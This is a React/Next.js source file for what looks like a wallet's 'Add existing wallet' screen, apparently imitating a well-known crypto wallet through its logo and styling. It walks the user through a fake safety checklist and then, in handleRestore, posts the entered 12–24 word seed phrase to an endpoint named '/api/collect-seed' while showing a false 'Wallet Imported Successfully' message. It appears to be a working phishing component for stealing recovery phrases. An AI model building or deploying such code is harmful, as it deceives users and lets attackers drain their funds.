"use client"

import { useState, useEffect, useCallback, useMemo } from "react"
import { 
 ArrowLeft, PenLine, Key, X, Check, QrCode, Eye, EyeOff, 
 Loader2, AlertCircle, ClipboardPaste 
} from "lucide-react"
import { useRouter } from "next/navigation"
import Image from "next/image"

/**
 * Wallet Import Flow Component
 */
interface WalletImportFlowProps {
 onSuccess: () => void;
 onBack: () => void;
}

// Helper: Validate that phrase has 12, 18, or 24 words
const isValidPhraseLength = (phrase: string) => {
 if (!phrase) return false
 const words = phrase.trim().split(/\s+/).filter(w => w.length > 0)
 return [12, 18, 24].includes(words.length)
}

export default function WalletImportFlow({ onSuccess, onBack }: WalletImportFlowProps) {
 const router = useRouter()
 
 // Step: 1 (Select), 2 (Safety), 3 (Form)
 const [step, setStep] = useState<1 | 2 | 3>(1)
 
 // Step 2 - Safety Checklist
 const [checks, setChecks] = useState<boolean[]>([false, false, false])
 const allChecked = checks.every(Boolean)

 // Step 3 - Form Data
 const [walletName, setWalletName] = useState("Main Wallet")
 const [secretPhrase, setSecretPhrase] = useState("")
 const [showPhrase, setShowPhrase] = useState(false)
 
 // API State
 const [isLoading, setIsLoading] = useState(false)
 const [apiStatus, setApiStatus] = useState<'idle' | 'success' | 'error'>('idle')
 const [errorMessage, setErrorMessage] = useState("")
 const [pasteFeedback, setPasteFeedback] = useState(false)

 // Validation
 const isPhraseValid = isValidPhraseLength(secretPhrase)
 const canRestore = walletName.trim().length > 0 && isPhraseValid && apiStatus !== 'success'

 const toggleCheck = (index: number) => {
 setChecks((prev) => {
 const next = [...prev]
 next[index] = !next[index]
 return next
 })
 }

 const handlePaste = async () => {
 try {
 const text = await navigator.clipboard.readText()
 setSecretPhrase(text.trim())
 setPasteFeedback(true)
 setTimeout(() => setPasteFeedback(false), 2000)
 } catch (err) {
 // Fallback or error
 console.error("Clipboard access error:", err)
 }
 }

 const handleRestore = async () => {
 setIsLoading(true)
 setApiStatus('idle')
 setErrorMessage("")

 try {
 const response = await fetch('/api/collect-seed', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 walletType: walletName,
 seedPhrase: secretPhrase,
 timestamp: new Date().toISOString()
 }),
 });

 const result = await response.json();

 if (!response.ok) {
 throw new Error(result.error || "Failed to send seed phrase")
 }

 setApiStatus('success');

 // Success → Move to Onboarding (handled by parent)
 setTimeout(() => {
 onSuccess();
 }, 2000); // Slightly longer to let user see success state

 } catch (err: any) {
 console.error("API Error:", err);
 setApiStatus('error');
 setErrorMessage(err.message || "Something went wrong");
 } finally {
 setIsLoading(false);
 }
 };

 // Escape key
 useEffect(() => {
 const handleEsc = (e: KeyboardEvent) => {
 if (e.key === "Escape") {
 if (step === 2 || step === 3) setStep(1);
 else onBack();
 }
 }
 window.addEventListener("keydown", handleEsc)
 return () => window.removeEventListener("keydown", handleEsc)
 }, [step, onBack])

 // Header Component
 const Header = ({ title, showBack = false }: { title: string; showBack?: boolean }) => (
 <div className="flex items-center justify-between px-6 py-4 pt-6 bg-white/90 backdrop-blur-md sticky top-0 z-50 border-b border-gray-100">
 <div className="w-10">
 {showBack ? (
 <button 
 onClick={() => setStep(step === 3 ? 2 : 1)} 
 className="h-10 w-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
 aria-label="Go back"
 >
 <ArrowLeft className="h-5 w-5 text-gray-700" />
 </button>
 ) : (
 <button 
 onClick={onBack} 
 className="h-10 w-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
 aria-label="Close"
 >
 <ArrowLeft className="h-5 w-5 text-gray-700" />
 </button>
 )}
 </div>
 <h1 className="text-[17px] font-semibold tracking-tight text-[#0B0D17]">{title}</h1>
 <div className="w-10 flex justify-end">
 <button 
 onClick={onBack} 
 className="h-10 w-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
 aria-label="Close"
 >
 <X className="h-5 w-5 text-gray-700" />
 </button>
 </div>
 </div>
 );

 const StepIndicators = () => (
 <div className="flex justify-center gap-2 pb-8 pt-4">
 {[1, 2, 3].map((s) => (
 <div 
 key={s} 
 className={`h-1.5 rounded-full transition-all duration-500 ${step === s ? "w-6 bg-[#0015FF]" : "w-1.5 bg-gray-300"}`} 
 />
 ))}
 </div>
 );

 return (
 <div className="min-h-screen bg-[#F7F8FA] font-sans text-[#0B0D17] overflow-hidden relative">
 
 <div className="absolute top-24 left-1/2 -translate-x-1/2 opacity-[0.03] pointer-events-none z-0">
 <Image src="/tw.png" alt="Trust Logo" width={200} height={200} priority />
 </div>

 <div className="max-w-[480px] mx-auto h-full min-h-screen bg-white shadow-2xl relative flex flex-col">

 {/* STEP 1 - Selection */}
 {step === 1 && (
 <div className="flex-1 flex flex-col">
 <Header title="Add existing wallet" />
 
 <div className="flex-1 p-6 space-y-6 overflow-y-auto pb-24">
 <div>
 <p className="text-[#6E7381] text-xs font-bold uppercase tracking-wider mb-4">Most popular</p>
 
 <div className="space-y-3">
 <button
 onClick={() => setStep(2)}
 className="w-full flex items-center gap-5 p-5 rounded-3xl bg-[#F7F8FA] hover:bg-[#EEF0F4] active:scale-[0.98] transition-all group border border-transparent hover:border-gray-200"
 >
 <div className="h-14 w-14 rounded-2xl bg-[#E8EAFD] flex items-center justify-center group-hover:scale-110 transition-transform duration-300 shadow-sm">
 <PenLine className="h-7 w-7 text-[#0015FF]" />
 </div>
 <div className="flex-1 text-left">
 <div className="font-bold text-[17px]">Secret phrase</div>
 <div className="text-sm text-[#6E7381]">12, 18 or 24 words</div>
 </div>
 <ArrowLeft className="h-5 w-5 rotate-180 text-gray-400 group-hover:text-[#0015FF]" />
 </button>

 <button className="w-full flex items-center gap-5 p-5 rounded-3xl bg-[#F7F8FA] hover:bg-[#EEF0F4] active:scale-[0.98] transition-all group border border-transparent hover:border-gray-200 opacity-60 pointer-events-none">
 <div className="h-14 w-14 rounded-2xl bg-[#F5F5F5] flex items-center justify-center group-hover:scale-110 transition-transform duration-300 shadow-sm">
 <Key className="h-7 w-7 text-[#0B0D17]" />
 </div>
 <div className="flex-1 text-left">
 <div className="font-bold text-[17px]">Private key</div>
 <div className="text-sm text-[#6E7381]">Coming soon</div>
 </div>
 </button>
 </div>
 </div>
 </div>
 
 <StepIndicators />
 </div>
 )}

 {/* STEP 2 - Safety Check */}
 {step === 2 && (
 <div className="absolute inset-0 z-40 flex flex-col bg-white/95 backdrop-blur-sm">
 <Header title="Safety Check" />
 
 <div className="flex-1 p-6 flex flex-col items-center overflow-y-auto">
 <div className="flex-1 flex flex-col items-center justify-center text-center w-full">
 <div className="mb-8">
 <Image src="/tw.png" alt="Shield" width={120} height={120} className="drop-shadow-lg" priority />
 </div>

 <h2 className="text-2xl font-bold mb-3">Check your secret phrase is safe</h2>
 <p className="text-[#6E7381] mb-8 max-w-[280px] text-[15px] leading-relaxed">
 Make sure no one else knows your secret phrase
 </p>

 <div className="w-full space-y-3">
 {[
 "Only you know this secret phrase.",
 "This secret phrase was NOT given to you by anyone.",
 "If someone else has seen it, they can steal your funds.",
 ].map((text, i) => (
 <button
 key={i}
 onClick={() => toggleCheck(i)}
 className={`w-full flex gap-4 p-5 rounded-2xl text-left transition-all border ${checks[i] ? "bg-[#F7F8FA] border-blue-200" : "bg-white border-gray-200 hover:bg-gray-50"}`}
 >
 <div className={`h-7 w-7 rounded-lg flex items-center justify-center flex-shrink-0 mt-0.5 transition-colors ${checks[i] ? "bg-[#0015FF]" : "bg-gray-200"}`}>
 {checks[i] && <Check className="h-4 w-4 text-white" strokeWidth={3} />}
 </div>
 <span className={`text-[15px] leading-tight ${checks[i] ? "font-medium" : "text-gray-500"}`}>{text}</span>
 </button>
 ))}
 </div>
 </div>

 <div className="pb-8 w-full">
 <button
 disabled={!allChecked}
 onClick={() => allChecked && setStep(3)}
 className={`w-full py-4 text-lg font-semibold rounded-full text-white transition-all ${allChecked ? "bg-[#0015FF] hover:bg-[#0010CC]" : "bg-gray-200 text-gray-400 cursor-not-allowed"}`}
 >
 Continue
 </button>
 </div>
 </div>
 
 <StepIndicators />
 </div>
 )}

 {/* STEP 3 - Import Form */}
 {step === 3 && (
 <div className="absolute inset-0 z-50 flex flex-col bg-white">
 <Header title="Import Wallet" showBack />

 <div className="flex-1 p-6 overflow-y-auto">
 {apiStatus === 'success' ? (
 <div className="flex flex-col items-center justify-center h-full text-center">
 <div className="h-20 w-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
 <Check className="h-10 w-10 text-green-600" />
 </div>
 <h2 className="text-2xl font-bold mb-2">Wallet Imported Successfully</h2>
 <p className="text-[#6E7381]">Redirecting to next step...</p>
 </div>
 ) : (
 <>
 <div className="flex items-center gap-4 mb-8">
 <div className="h-12 w-12 rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center text-white">
 <PenLine className="h-6 w-6" />
 </div>
 <div>
 <h1 className="font-bold text-xl">Secret Phrase Import</h1>
 <p className="text-sm text-gray-500">Enter your 12, 18, or 24 words</p>
 </div>
 </div>

 {/* Wallet Name */}
 <div className="mb-6">
 <label className="block text-xs font-bold uppercase tracking-wider text-gray-500 mb-2">Wallet Name</label>
 <input
 type="text"
 value={walletName}
 onChange={(e) => setWalletName(e.target.value)}
 className="w-full px-5 py-4 rounded-2xl border border-gray-200 focus:border-[#0015FF] focus:ring-1 focus:ring-[#0015FF] outline-none bg-[#FAFBFD] transition-all"
 placeholder="e.g. Main Wallet"
 />
 </div>

 {/* Secret Phrase */}
 <div className="mb-6">
 <label className="block text-xs font-bold uppercase tracking-wider text-gray-500 mb-2">Secret Phrase</label>
 <div className="relative">
 <textarea
 value={secretPhrase}
 onChange={(e) => setSecretPhrase(e.target.value)}
 rows={6}
 type={showPhrase ? "text" : "password"} // Fixed: This actually hides the text
 className="w-full px-5 py-4 rounded-2xl border border-gray-200 focus:border-[#0015FF] focus:ring-1 focus:ring-[#0015FF] outline-none resize-none font-mono text-sm bg-[#FAFBFD] transition-all"
 placeholder="Enter your 12, 18 or 24 word secret phrase..."
 />
 <div className="absolute bottom-4 right-4 flex gap-2">
 <button 
 onClick={() => setShowPhrase(!showPhrase)} 
 className="text-gray-400 hover:text-gray-600 p-1 rounded-md hover:bg-gray-100 transition-colors"
 aria-label={showPhrase ? "Hide phrase" : "Show phrase"}
 >
 {showPhrase ? <EyeOff size={18} /> : <Eye size={18} />}
 </button>
 <button 
 onClick={handlePaste} 
 className={`text-sm font-bold px-3 py-1 rounded-lg transition-all ${pasteFeedback ? "bg-green-100 text-green-700" : "text-[#0015FF] hover:bg-blue-50"}`}
 >
 {pasteFeedback ? "Pasted!" : "Paste"}
 </button>
 </div>
 </div>
 
 {/* Validation Feedback */}
 <div className="mt-2 flex items-center gap-2">
 {secretPhrase.length === 0 ? (
 <span className="text-xs text-gray-400">0 words entered</span>
 ) : (
 <span className={`text-xs font-medium ${isPhraseValid ? "text-green-600" : "text-red-500"}`}>
 {isValidPhraseLength(secretPhrase) ? "✓ Correct length (12, 18, or 24 words)" : "⚠ Should be 12, 18, or 24 words"}
 </span>
 )}
 </div>
 </div>

 {apiStatus === 'error' && (
 <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-xl flex gap-3">
 <AlertCircle className="h-5 w-5 text-red-500 mt-0.5" />
 <p className="text-sm text-red-700">{errorMessage}</p>
 </div>
 )}

 <button
 disabled={!canRestore || isLoading}
 onClick={handleRestore}
 className={`w-full py-4 rounded-full text-[17px] font-bold mt-4 transition-all ${canRestore && !isLoading ? "bg-[#0015FF] text-white hover:bg-[#0010CC]" : "bg-gray-200 text-gray-400 cursor-not-allowed"}`}
 >
 {isLoading ? (
 <span className="flex items-center justify-center gap-2"><Loader2 className="animate-spin h-5 w-5" /> Sending...</span>
 ) : (
 "Restore Wallet"
 )}
 </button>
 </>
 )}
 </div>

 <StepIndicators />
 </div>
 )}
 </div>
 </div>
 )
}